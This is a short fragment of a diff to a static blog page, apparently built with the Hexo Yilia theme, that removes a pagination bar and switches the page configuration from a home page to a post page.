-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -652,8 +370,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
